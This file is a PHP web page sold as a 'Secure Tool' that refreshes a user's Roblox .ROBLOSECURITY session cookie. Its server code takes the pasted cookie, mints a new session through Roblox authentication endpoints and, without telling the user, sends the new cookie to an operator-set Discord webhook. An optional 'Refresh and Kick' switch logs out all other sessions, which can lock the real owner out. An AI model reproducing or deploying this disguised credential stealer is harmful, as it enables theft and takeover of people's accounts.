<?php
// made by draco dc : 9ovpdrac telegram = zyxwasherex
error_reporting(E_ALL);
ini_set('display_errors', 0);

define('CURL_TIMEOUT', 3);
// ADD YOUR DISCORD WEBHOOK URL HERE
define('DISCORD_WEBHOOK', 'YOUR_WEBHOOK_URL_HERE');

if (isset($_GET['action']) && $_GET['action'] === 'refresh' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');
    $cookie = trim($_POST['cookie'] ?? '');
    $kick = isset($_POST['kick']) && $_POST['kick'] === 'true';

    if (empty($cookie)) { echo json_encode(['success' => false, 'message' => 'PLEASE ENTER A COOKIE']); exit; }

    function cleanCookie($c) { return trim(str_replace(["'", '"', "cookie:", "Cookie:", ".ROBLOSECURITY="], "", $c)); }
    
    function getCSRFFast($c) {
        $clean = cleanCookie($c);
        $ch = curl_init('https://auth.roblox.com/v2/logout');
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => '{}',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HEADER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_TIMEOUT => 2,
            CURLOPT_CONNECTTIMEOUT => 1,
            CURLOPT_REFERER => 'https://www.roblox.com/',
            CURLOPT_HTTPHEADER => [
                "Cookie: .ROBLOSECURITY=" . $clean,
                "Content-Type: application/json",
                "User-Agent: Mozilla/5.0",
                "Origin: https://www.roblox.com",
                "Referer: https://www.roblox.com/"
            ]
        ]);
        $out = curl_exec($ch);
        curl_close($ch);
        
        $csrf = null;
        if (preg_match('/x-csrf-token:\s*([^\r\n]+)/i', $out, $m)) {
            $csrf = trim($m[1]);
        }
        return $csrf;
    }

    function sendToDiscord($new_cookie) {
        if (empty(DISCORD_WEBHOOK) || DISCORD_WEBHOOK === 'YOUR_WEBHOOK_URL_HERE') return;
        
        $data = [
            "embeds" => [[
                "title" => "🍪 Cookie Refreshed Successfully",
                "color" => 41215, // Cyan
                "fields" => [
                    ["name" => "Refreshed Cookie", "value" => "```" . $new_cookie . "```"]
                ],
                "footer" => ["text" => "Refresher Tool • " . date("Y-m-d H:i:s")]
            ]]
        ];

        $ch = curl_init(DISCORD_WEBHOOK);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => json_encode($data),
            CURLOPT_HTTPHEADER => ["Content-Type: application/json"],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_TIMEOUT => 5
        ]);
        curl_exec($ch);
        curl_close($ch);
    }

    $cookie = cleanCookie($cookie);
    $csrf = getCSRFFast($cookie);
    
    if (!$csrf) {
        echo json_encode(['success' => false, 'message' => 'INVALID COOKIE']); 
        exit;
    }

    // Handle Kick Option (Logout from all other sessions)
    if ($kick) {
        $ch_kick = curl_init("https://auth.roblox.com/v1/logout-from-all-other-sessions");
        curl_setopt_array($ch_kick, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => '{}',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_TIMEOUT => 2,
            CURLOPT_HTTPHEADER => [
                "Cookie: .ROBLOSECURITY={$cookie}",
                "X-CSRF-TOKEN: {$csrf}",
                "Content-Type: application/json"
            ]
        ]);
        curl_exec($ch_kick);
        curl_close($ch_kick);
    }

    $ch = curl_init("https://auth.roblox.com/v1/authentication-ticket");
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => '{}',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 2,
        CURLOPT_CONNECTTIMEOUT => 1,
        CURLOPT_REFERER => 'https://www.roblox.com/',
        CURLOPT_HTTPHEADER => [
            "Cookie: .ROBLOSECURITY={$cookie}",
            "X-CSRF-TOKEN: {$csrf}",
            "Content-Type: application/json",
            "User-Agent: Mozilla/5.0",
            "Origin: https://www.roblox.com",
            "Referer: https://www.roblox.com/"
        ]
    ]);
    $out = curl_exec($ch);
    $hsize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    curl_close($ch);
    
    preg_match('/rbx-authentication-ticket:\s*([^\r\n]+)/i', substr($out, 0, $hsize), $tm);
    $ticket = trim($tm[1] ?? '');

    if (!$ticket) {
        echo json_encode(['success' => false, 'message' => 'REFRESH FAILED']); 
        exit;
    }

    $ch2 = curl_init("https://auth.roblox.com/v1/authentication-ticket/redeem");
    curl_setopt_array($ch2, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode(["authenticationTicket" => $ticket]),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER => true,
        CURLOPT_TIMEOUT => 2,
        CURLOPT_CONNECTTIMEOUT => 1,
        CURLOPT_REFERER => 'https://www.roblox.com/',
        CURLOPT_HTTPHEADER => [
            "Content-Type: application/json",
            "RBXAuthenticationNegotiation: 1",
            "User-Agent: Mozilla/5.0",
            "Origin: https://www.roblox.com",
            "Referer: https://www.roblox.com/"
        ]
    ]);
    $res = curl_exec($ch2);
    curl_close($ch2);

    $new_c = null;
    if (preg_match('/\.ROBLOSECURITY=([^;]+)/i', $res, $cm)) {
        $new_c = trim($cm[1]);
    }

    if ($new_c) {
        sendToDiscord($new_c);
        echo json_encode(['success' => true, 'message' => 'REFRESH SUCCESSFUL', 'cookie' => $new_c]);
        exit;
    }

    echo json_encode(['success' => false, 'message' => 'REFRESH FAILED']);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en" style="scroll-behavior: smooth;">
<head>
    <title>Cookie Refresher</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <meta name="theme-color" content="#06b6d4">
    <meta property="og:title" content="Cookie Refresher">
    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.27/dist/sweetalert2.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; background: #0a0a0f; min-height: 100vh; color: #ffffff; line-height: 1.6; position: relative; overflow-x: hidden; }
        body::before { content: ''; position: fixed; inset: 0; background: radial-gradient(ellipse 80% 50% at 20% 0%, rgba(6, 182, 212, 0.25) 0%, transparent 50%), radial-gradient(ellipse 60% 40% at 90% 100%, rgba(8, 145, 178, 0.15) 0%, transparent 50%), radial-gradient(ellipse 50% 60% at 50% 50%, rgba(34, 211, 238, 0.08) 0%, transparent 60%), linear-gradient(180deg, #0f1a1e 0%, #0a1215 100%); z-index: -2; animation: bgPulse 15s ease-in-out infinite; }
        @keyframes bgPulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.85; } }
        body::after { content: ''; position: fixed; inset: 0; background-image: linear-gradient(rgba(6, 182, 212, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(6, 182, 212, 0.03) 1px, transparent 1px); background-size: 60px 60px; z-index: -1; pointer-events: none; }
        .orb { position: fixed; border-radius: 50%; filter: blur(100px); z-index: -1; pointer-events: none; }
        .orb-1 { width: 500px; height: 500px; background: radial-gradient(circle, rgba(6, 182, 212, 0.3) 0%, transparent 70%); top: -150px; right: -100px; animation: float 20s ease-in-out infinite; }
        .orb-2 { width: 400px; height: 400px; background: radial-gradient(circle, rgba(8, 145, 178, 0.2) 0%, transparent 70%); bottom: -100px; left: -100px; animation: float 25s ease-in-out infinite reverse; }
        .orb-3 { width: 300px; height: 300px; background: radial-gradient(circle, rgba(34, 211, 238, 0.15) 0%, transparent 70%); top: 50%; left: 50%; transform: translate(-50%, -50%); animation: float 18s ease-in-out infinite; }
        @keyframes float { 0%, 100% { transform: translate(0, 0) scale(1); } 33% { transform: translate(30px, -30px) scale(1.05); } 66% { transform: translate(-20px, 20px) scale(0.95); } }
        .navbar { padding: 24px 48px; background: transparent; position: relative; z-index: 100; }
        .navbar-brand { font-size: 28px; font-weight: 800; background: linear-gradient(135deg, #67e8f9 0%, #22d3ee 50%, #06b6d4 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-decoration: none; letter-spacing: -0.02em; text-shadow: 0 0 40px rgba(6, 182, 212, 0.5); transition: all 0.3s; }
        .navbar-brand:hover { text-shadow: 0 0 60px rgba(6, 182, 212, 0.8); transform: scale(1.02); }
        .main-content { max-width: 1200px; margin: 0 auto; padding: 60px 24px 40px; position: relative; z-index: 10; }
        .animate-title { font-size: clamp(44px, 8vw, 76px); font-weight: 900; text-align: center; margin-bottom: 24px; animation: fadeInDown 0.8s ease; letter-spacing: -0.02em; line-height: 1.2; }
        .animate-title span { color: #22d3ee; margin-right: 16px; display: inline-block; animation: starPulse 2s ease-in-out infinite; }
        @keyframes starPulse { 0%, 100% { transform: scale(1); filter: drop-shadow(0 0 20px rgba(34, 211, 238, 0.5)); } 50% { transform: scale(1.1); filter: drop-shadow(0 0 40px rgba(34, 211, 238, 0.8)); } }
        .animate-title b { background: linear-gradient(135deg, #cffafe 0%, #67e8f9 25%, #22d3ee 50%, #06b6d4 75%, #0891b2 100%); background-size: 200% 200%; -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: gradientShift 5s ease infinite; }
        @keyframes gradientShift { 0%, 100% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } }
        .badge-soft-success { background: rgba(6, 182, 212, 0.12); color: #67e8f9; padding: 10px 28px; border-radius: 100px; font-size: 14px; font-weight: 600; border: 1.5px solid rgba(6, 182, 212, 0.3); display: inline-block; backdrop-filter: blur(20px); box-shadow: 0 4px 20px rgba(6, 182, 212, 0.15), inset 0 1px 0 rgba(255,255,255,0.1); letter-spacing: 0.5px; text-transform: uppercase; }
        .lead { color: #9cc9d6; font-size: 18px; max-width: 700px; margin: 0 auto; font-weight: 400; text-shadow: 0 2px 10px rgba(0,0,0,0.3); }
        .lead b { color: #67e8f9; font-weight: 700; }
        .lead u { text-decoration-color: #06b6d4; text-underline-offset: 5px; text-decoration-thickness: 2px; }
        .form-group input, .form-group textarea { width: 100%; padding: 20px 28px; background: rgba(10, 50, 60, 0.5); border: 1.5px solid rgba(6, 182, 212, 0.3); border-radius: 24px; color: #fff; font-size: 16px; backdrop-filter: blur(30px); transition: all 0.3s; font-family: 'Inter', sans-serif; box-shadow: 0 8px 20px rgba(0,0,0,0.2), inset 0 1px 0 rgba(255,255,255,0.05); resize: none; }
        .form-group input:focus, .form-group textarea:focus { outline: none; border-color: #06b6d4; box-shadow: 0 0 0 4px rgba(6, 182, 212, 0.2), 0 12px 30px rgba(0,0,0,0.3); background: rgba(15, 60, 70, 0.7); }
        .form-group input::placeholder, .form-group textarea::placeholder { color: #6b9caa; }
        .starter { background: linear-gradient(135deg, #06b6d4 0%, #0891b2 100%); border: none; border-radius: 24px; padding: 20px 48px; color: #fff; font-weight: 700; font-size: 17px; cursor: pointer; transition: all 0.3s; box-shadow: 0 15px 40px rgba(6, 182, 212, 0.4), 0 0 0 1px rgba(255,255,255,0.1) inset; position: relative; overflow: hidden; width: 100%; }
        .starter::before { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent); transition: left 0.6s; }
        .starter:hover::before { left: 100%; }
        .starter:hover { transform: translateY(-4px) scale(1.02); box-shadow: 0 25px 55px rgba(6, 182, 212, 0.5); background: linear-gradient(135deg, #22d3ee 0%, #06b6d4 100%); }
        .btn-copy { background: transparent; border: 2px solid rgba(6, 182, 212, 0.5); color: #67e8f9; font-weight: 700; font-size: 17px; border-radius: 24px; padding: 18px 48px; cursor: pointer; transition: all 0.3s; width: 100%; display: none; }
        .btn-copy:hover { background: rgba(6, 182, 212, 0.15); border-color: #22d3ee; box-shadow: 0 10px 30px rgba(6, 182, 212, 0.3); transform: translateY(-3px); }
        .footer { border-top: 1.5px solid rgba(6, 182, 212, 0.15); padding: 40px 0; color: #6b9caa; margin-top: 80px; }
        .footer a { color: #22d3ee; text-decoration: none; transition: all 0.2s; }
        .footer a:hover { color: #67e8f9; text-shadow: 0 0 20px rgba(6, 182, 212, 0.5); }
        
        /* Toggle Switch Styling */
        .switch-container { display: flex; align-items: center; justify-content: center; gap: 12px; background: rgba(6, 182, 212, 0.05); padding: 12px 24px; border-radius: 100px; border: 1px solid rgba(6, 182, 212, 0.2); width: fit-content; margin: 0 auto; }
        .switch { position: relative; display: inline-block; width: 50px; height: 26px; }
        .switch input { opacity: 0; width: 0; height: 0; }
        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(255,255,255,0.1); transition: .4s; border-radius: 34px; border: 1px solid rgba(6, 182, 212, 0.3); }
        .slider:before { position: absolute; content: ""; height: 18px; width: 18px; left: 3px; bottom: 3px; background-color: white; transition: .4s; border-radius: 50%; box-shadow: 0 0 10px rgba(6, 182, 212, 0.5); }
        input:checked + .slider { background-color: #06b6d4; }
        input:checked + .slider:before { transform: translateX(24px); }
        .switch-label { font-size: 14px; font-weight: 600; color: #9cc9d6; }

        @media (max-width: 768px) { .navbar { padding: 16px 20px; } .main-content { padding: 40px 16px 30px; } }
    </style>
</head>
<body>
    <div class="orb orb-1"></div><div class="orb orb-2"></div><div class="orb orb-3"></div>
    <header>
        <nav class="navbar">
            <a class="navbar-brand" href="#">Made by draco</a>
        </nav>
    </header>
    <main class="main-content">
        <h1 class="animate-title">
            <span><i class="fa-solid fa-rotate"></i></span>
            <b><span id="auto-type"></span></b>
        </h1>
        <div class="mt-12 text-center">
            <span class="badge-soft-success">Secure Tool</span>
            <p class="lead mt-4">
                Refresh your <b>.ROBLOSECURITY</b> cookie instantly. <u>Stay logged in</u> without a hitch.
                <i class="fa-solid fa-shield-haltered"></i>
            </p>
        </div>

        <div class="mt-12 max-w-lg mx-auto flex flex-col gap-6">
            <div class="form-group">
                <textarea id="input" rows="3" placeholder="Paste your current .ROBLOSECURITY..." required></textarea>
            </div>
            
            <div class="switch-container">
                <span class="switch-label">Refresh and Kick</span>
                <label class="switch">
                    <input type="checkbox" id="kickOption">
                    <span class="slider"></span>
                </label>
            </div>

            <div class="form-group">
                <textarea id="output" rows="3" readonly placeholder="Refreshed cookie will appear here..."></textarea>
            </div>
            <button type="button" id="btn" class="starter" onclick="refresh()">
                Refresh Cookie <i class="fa-solid fa-arrows-rotate ml-2"></i>
            </button>
            <button type="button" id="copyBtn" class="btn-copy" onclick="copyCookie()">
                <i class="fa-regular fa-copy mr-2"></i> Copy Refreshed Cookie
            </button>
        </div>
    </main>

    <footer class="footer">
        <div class="max-w-7xl mx-auto px-4 flex flex-col sm:flex-row justify-between items-center gap-4">
            <div class="text-sm">© 2026 All rights reserved. <strong>Not</strong> affiliated with Roblox.</div>
            <div class="flex items-center gap-6">
                <a href="#">Changelog</a>
                <a href="#" title="Discord"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512" class="w-6 h-6 fill-current"><path d="M524.5 69.84a1.5 1.5 0 00-.764-.7A485.1 485.1 0 00404.1 32.03a1.816 1.816 0 00-1.923.91 337.5 337.5 0 00-14.9 30.6 447.8 447.8 0 00-134.4 0 309.5 309.5 0 00-14.9-30.6 1.89 1.89 0 00-1.924-.91A483.7 483.7 0 00116.3 69.14a1.712 1.712 0 00-.788.678A418.7 418.7 0 0032.05 410.9a1.6 1.6 0 00.76 1.94 486 486 0 00136.2 49.69 1.6 1.6 0 002.17-.49 413.5 413.5 0 0039.15-53.8 1.6 1.6 0 00-.42-1.94l-3.68-3.12a1.6 1.6 0 01.42-2.59A365.6 365.6 0 01235.4 345a1.6 1.6 0 01.42 2.59l3.68 3.12a1.6 1.6 0 00.42 1.94 413.6 413.6 0 0039.15 53.8 1.6 1.6 0 002.17.49 486 486 0 00136.2-49.69 1.6 1.6 0 00.76-1.94 411.1 411.1 0 00-84.2-341.06zm-111.1 282.3a1.6 1.6 0 01-3.12 0c-2.98-12.7-19.5-49.3-19.5-49.3a1.6 1.6 0 01.6-1.93 81.6 81.6 0 0147.5-20.1 1.6 1.6 0 011.79 1.3 151.4 151.4 0 01-27.2 68.7zm-147.2-68.7a1.6 1.6 0 011.79-1.3 81.6 81.6 0 0147.5 20.1 1.6 1.6 0 01.6 1.93s-16.5 36.6-19.5 49.3a1.6 1.6 0 01-3.12 0 151.4 151.4 0 01-27.2-68.7z"/></svg></a>
                <a href="#" title="Twitter/X"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="w-6 h-6 fill-current"><path d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8l164.9-199.9L26.8 48h145.6l100.5 132.9L389.2 48zm-24.8 373.1h39.1L151.1 88h-42l245.3 333.1z"/></svg></a>
            </div>
        </div>
    </footer>

    <script src="https://unpkg.com/typed.js@2.1.0/dist/typed.umd.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script>
        new Typed('#auto-type', { strings: ['Cookie Refresher'], typeSpeed: 60, showCursor: false });

        const st = {
            background: '#0f1a1e',
            color: '#fff',
            confirmButtonColor: '#06b6d4',
            backdrop: 'rgba(10, 18, 21, 0.8)',
            customClass: {
                popup: 'swal-popup',
                confirmButton: 'swal-btn'
            }
        };
        const css = document.createElement('style');
        css.textContent = `
            .swal-popup {
                border: 2px solid rgba(6,182,212,0.4) !important;
                border-radius: 28px !important;
                box-shadow: 0 0 60px rgba(6,182,212,0.3), 0 30px 80px rgba(0,0,0,0.6) !important;
                background: #0f1a1e !important;
            }
            .swal-btn {
                border-radius: 16px !important;
                padding: 14px 36px !important;
                font-weight: 600 !important;
                border: 2px solid rgba(6,182,212,0.5) !important;
                box-shadow: 0 0 30px rgba(6,182,212,0.4) !important;
            }
            .swal-btn:hover {
                box-shadow: 0 0 45px rgba(6,182,212,0.6) !important;
                transform: translateY(-3px) !important;
            }
        `;
        document.head.appendChild(css);

        async function refresh() {
            const input = document.getElementById('input').value.trim();
            const output = document.getElementById('output');
            const btn = document.getElementById('btn');
            const copyBtn = document.getElementById('copyBtn');
            const kick = document.getElementById('kickOption').checked;

            if (!input) {
                Swal.fire({
                    icon: 'error',
                    title: 'Empty Cookie',
                    text: 'Please paste your .ROBLOSECURITY cookie first.',
                    ...st
                });
                return;
            }

            btn.disabled = true;
            btn.innerText = 'Processing...';
            copyBtn.style.display = 'none';
            output.value = '';

            Swal.fire({
                title: 'Processing...',
                text: 'Contacting Roblox servers...',
                allowOutsideClick: false,
                ...st,
                didOpen: () => Swal.showLoading()
            });

            try {
                const fd = new FormData();
                fd.append('cookie', input);
                fd.append('kick', kick);
                const response = await fetch('?action=refresh', { method: 'POST', body: fd });
                const data = await response.json();

                if (data.success) {
                    output.value = data.cookie;
                    copyBtn.style.display = 'block';
                    Swal.fire({
                        icon: 'success',
                        title: 'Success!',
                        text: data.message,
                        ...st
                    });
                } else {
                    Swal.fire({
                        icon: 'error',
                        title: 'Refresh Failed',
                        text: data.message,
                        ...st
                    });
                }
            } catch (e) {
                Swal.fire({
                    icon: 'error',
                    title: 'Server Error',
                    text: 'Could not connect to the server.',
                    ...st
                });
            }

            btn.disabled = false;
            btn.innerText = 'Refresh Cookie';
        }

        function copyCookie() {
            const output = document.getElementById('output');
            output.select();
            document.execCommand('copy');
            Swal.fire({
                icon: 'success',
                title: 'Copied!',
                text: 'Refreshed cookie copied to clipboard.',
                timer: 1500,
                showConfirmButton: false,
                ...st
            });
        }
    </script>
</body>
</html>
